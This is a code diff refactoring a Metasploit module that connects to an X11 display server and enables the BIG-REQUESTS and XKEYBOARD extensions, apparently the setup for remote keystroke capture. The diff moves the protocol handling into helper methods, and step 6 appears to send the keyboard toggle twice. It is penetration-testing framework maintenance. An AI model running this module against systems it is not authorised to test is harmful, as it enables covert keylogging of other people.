@@ -7,7 +7,7 @@ class MetasploitModule < Msf::Auxiliary
   include Exploit::Remote::Tcp
   include Rex::Proto::X11
   include Msf::Auxiliary::Report
-  include Msf::Exploit::Remote::X11::Connect
+  include Msf::Exploit::Remote::X11
 
   def initialize(info = {})
     super(
@@ -72,37 +72,6 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     Exploit::CheckCode::Safe('X11 connection was not successful')
-  end
-
-  def process_initial_connection_response(packet)
-    begin
-      connection = X11ConnectionResponse.read(packet)
-    rescue EOFError
-      vprint_bad("Connection packet malformed (size: #{packet.length}), attempting to get read more data")
-      packet += sock.get_once(-1, 1)
-      begin
-        connection = X11ConnectionResponse.read(packet)
-      rescue StandardError
-        fail_with(Msf::Module::Failure::UnexpectedReply, 'Failed to parse X11 connection initialization response packet')
-      end
-    end
-    connection
-  end
-
-  def process_extension_query(packet, extension)
-    begin
-      extension_response = X11QueryExtensionResponse.read(packet)
-    rescue ::EOFError
-      packet += sock
-      fail_with(Msf::Module::Failure::UnexpectedReply, "Unable to process QueryExtension Response. Raw packet: #{packet}")
-    end
-
-    if extension_response.present == 1
-      print_good("  Extension #{extension} is present with id #{extension_response.major_opcode}")
-    else
-      fail_with(Msf::Module::Failure::UnexpectedReply, "Extension #{extension} is NOT present (#{packet.inspect})")
-    end
-    extension_response
   end
 
   # This function takes map data and converts it to a hashtable so that
@@ -175,28 +144,59 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     vprint_status('[2/9] Checking on BIG-REQUESTS extension')
-    sock.put(X11QueryExtensionRequest.new(extension: 'BIG-REQUESTS', unused2: query_extension_calls).to_binary_s) # check if BIG-REQUESTS exist, not sure why
-    query_extension_calls += 1
-    big_requests_plugin = process_extension_query(sock.get_once(-1, 1), 'BIG-REQUESTS')
+    big_requests_plugin = query_extension('BIG-REQUESTS', query_extension_calls)
+    fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to process response') if big_requests_plugin.nil?
+    if big_requests_plugin.present == 1
+      print_good("  Extension BIG-REQUESTS is present with id #{big_requests_plugin.major_opcode}")
+    else
+      fail_with(Msf::Module::Failure::UnexpectedReply, 'Extension BIG-REQUESTS is NOT present')
+    end
 
     vprint_status('[3/9] Enabling BIG-REQUESTS')
-    sock.put(X11ExtensionToggleRequest.new(opcode: big_requests_plugin.major_opcode).to_binary_s) # not sure why we do this
-    sock.get_once(-1, 1)
+    toggle = toggle_extension(big_requests_plugin.major_opcode)
+    fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to enable extension') if toggle.nil?
 
     vprint_status('[4/9] Creating new graphical context')
-    sock.put(X11CreateGraphicalContextRequest.new(cid: connection.body.resource_id_base,
-                                                  drawable: connection.body.screen_root,
-                                                  gc_value_mask_background: 1).to_binary_s +
-             X11GetPropertyRequest.new(window: connection.body.screen_root).to_binary_s) # not sure why we do this
-    sock.get_once(-1, 1)
+    gc_header = X11RequestHeader.new(opcode: 55)
+    gc_body = X11CreateGraphicalContextRequestBody.new(
+      cid: connection.body.resource_id_base,
+      drawable: connection.body.screen_root,
+      gc_value_mask_background: 1
+    )
+
+    gp_header = X11RequestHeader.new(opcode: 20)
+    gp_body = X11GetPropertyRequestBody.new(window: connection.body.screen_root)
+
+    sock.put(gc_header.to_binary_s +
+             gc_body.to_binary_s +
+             gp_header.to_binary_s +
+             gp_body.to_binary_s) # not sure why we do this
+
+    # nothing valuable in the response, just make sure we read it in to
+    # confirm its expected data and not leave the response on the socket
+    begin
+      packet = sock.timed_read(X11GetPropertyResponseHeader.new.num_bytes)
+      packet_header = X11GetPropertyResponseHeader.read(packet)
+
+      packet = sock.timed_read(packet_header.value_length * 4)
+      X11GetPropertyResponseData.read(packet)
+    rescue StandardError => e
+      vprint_bad("Error (#{e}) processing data: #{packet.bytes.map { |b| %(\\x) + b.to_s(16).rjust(2, '0') }.join}")
+    end
 
     vprint_status('[5/9] Checking on XKEYBOARD extension')
-    sock.put(X11QueryExtensionRequest.new(extension: 'XKEYBOARD', unused2: query_extension_calls).to_binary_s) # check if XKEYBOARD exist, not sure why
-    xkeyboard_plugin = process_extension_query(sock.get_once(-1, 1), 'XKEYBOARD')
+    xkeyboard_plugin = query_extension('XKEYBOARD', query_extension_calls)
+    fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to process response') if xkeyboard_plugin.nil?
+    if xkeyboard_plugin.present == 1
+      print_good("  Extension XKEYBOARD is present with id #{xkeyboard_plugin.major_opcode}")
+    else
+      fail_with(Msf::Module::Failure::UnexpectedReply, 'Extension XKEYBOARD is NOT present')
+    end
 
     vprint_status('[6/9] Enabling XKEYBOARD')
     sock.put(X11ExtensionToggleRequest.new(opcode: xkeyboard_plugin.major_opcode, wanted_major: 1).to_binary_s) # use keyboard
-    sock.get_once(-1, 1)
+    toggle = toggle_extension(xkeyboard_plugin.major_opcode)
+    fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to enable extension') if toggle.nil?
 
     vprint_status('[7/9] Requesting XKEYBOARD map')
     sock.put(X11GetMapRequest.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
